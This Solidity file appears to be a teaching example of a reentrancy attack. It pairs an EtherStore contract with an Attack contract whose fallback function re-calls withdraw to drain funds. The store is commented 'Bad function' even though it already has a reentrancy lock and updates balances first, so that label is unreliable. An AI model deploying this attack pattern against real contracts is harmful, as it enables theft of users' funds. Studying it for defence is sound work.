pragma solidity ^0.6.10;

// Bad function
contract EtherStore {
    mapping (address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    bool internal locked;
    
    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw(uint _amount) public noReentrant {
        require(balances[msg.sender] >= _amount);
        
        balances[msg.sender] -= _amount;
        
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Reentrancy Attack function
contract Attack {
    EtherStore public etherStore;
    
    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }
    
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw(1 ether);
        }
    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}